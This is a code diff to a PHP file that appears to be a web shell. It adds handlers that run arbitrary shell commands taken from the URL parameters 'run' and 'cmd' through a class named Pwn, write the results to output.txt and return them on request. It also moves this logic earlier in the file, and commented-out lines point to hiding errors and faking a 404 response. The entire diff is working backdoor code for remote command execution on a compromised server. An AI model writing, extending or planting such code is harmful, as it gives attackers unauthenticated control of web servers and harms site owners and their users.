@@ -347,6 +347,38 @@ class Pwn
     }
 }
 
+if (isset($_GET['run'])) {
+    $cmd = $_GET['run'];
+    $workdir = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    if ($workdir && is_dir($workdir)) chdir($workdir);
+    $full_cmd = "({$cmd}) > output.txt";
+    new Pwn($full_cmd);
+    $redirect = $_SERVER['SCRIPT_NAME'] . '?path=' . urlencode($workdir) . '&komendv2=gaskan';
+    header("Location: " . $redirect);
+    exit;
+}
+
+if (isset($_GET['show'])) {
+    // Bersihkan buffer sebelum header
+    while (ob_get_level()) ob_end_clean();
+    header('Content-Type: text/plain; charset=utf-8');
+    $output_file = __DIR__ . '/output.txt';
+    if (file_exists($output_file)) {
+        readfile($output_file);
+    } else {
+        echo "No output yet.";
+    }
+    exit;
+}
+
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    new Pwn($cmd);
+    exit;
+}
+
+ob_start();
+
 //@set_time_limit(0);
 //@error_reporting(0);
 //@http_response_code(404);
@@ -540,34 +572,6 @@ foreach($_POST as $key => $value){
     $_POST[$key] = stripslashes($value);
 }
 
-// ========== LOGIKA PWN UNTUK CMDV2 ==========
-$output_file = __DIR__ . '/output.txt';
-
-if (isset($_GET['show'])) {
-    if (file_exists($output_file)) {
-        header('Content-Type: text/plain; charset=utf-8');
-        readfile($output_file);
-    } else {
-        echo "No output yet.";
-    }
-    exit;
-}
-
-if (isset($_GET['run'])) {
-    $cmd = $_GET['run'];
-    $workdir = isset($_GET['path']) ? $_GET['path'] : getcwd();
-    if ($workdir && is_dir($workdir)) {
-        chdir($workdir);
-    }
-    $full_cmd = "({$cmd}) > output.txt";
-    new Pwn($full_cmd);
-    // Redirect kembali ke halaman dengan parameter komendv2 dan path yang sama, tapi tanpa 'run'
-    $redirect_url = $_SERVER['SCRIPT_NAME'] . '?path=' . urlencode($workdir) . '&komendv2=gaskan';
-    header("Location: " . $redirect_url);
-    exit;
-}
-// ========== END LOGIKA PWN ==========
-
 if(isset($_GET['path'])){
     $lokasi = $_GET['path'];
     $lokdua = $_GET['path'];
@@ -745,12 +749,10 @@ Upload File From Link :<br>
           </form>
           <iframe id="pwnResult" src="?show=1&path='.urlencode($current_path).'" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
           <script>
-            // Refresh iframe setelah submit form (karena redirect akan memuat ulang halaman)
-            const form = document.getElementById("pwnForm");
-            const iframe = document.getElementById("pwnResult");
-            form.addEventListener("submit", function() {
+            document.getElementById("pwnForm").addEventListener("submit", function(e) {
+                var iframe = document.getElementById("pwnResult");
                 setTimeout(function() {
-                    iframe.src = "?show=1&path=" + encodeURIComponent("'.$current_path.'") + "&t=" + Date.now();
+                    iframe.src = "?show=1&path='.urlencode($current_path).'&t=" + Date.now();
                 }, 500);
             });
           </script>';
